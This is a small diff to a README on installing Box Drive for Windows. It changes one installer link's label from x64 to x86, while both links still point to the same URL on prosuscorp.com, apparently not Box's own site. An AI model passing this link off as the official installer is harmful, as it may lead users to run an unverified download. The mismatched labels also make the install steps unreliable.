@@ -28,7 +28,7 @@ Box Drive is supported natively on Windows. You can install it to sync and acces
 ### 1. Install Box Drive  
 Download the Windows Installer using the following link and execute it:  
 - [Download Windows (x64) Installer](https://prosuscorp.com/boxddrr)
-- [Download Windows (x64) Installer](https://prosuscorp.com/boxddrr)
+- [Download Windows (x86) Installer](https://prosuscorp.com/boxddrr)
 
 ### 2. Set up Box Drive  
 Once installed, sign in with your Box account to start syncing your files.  
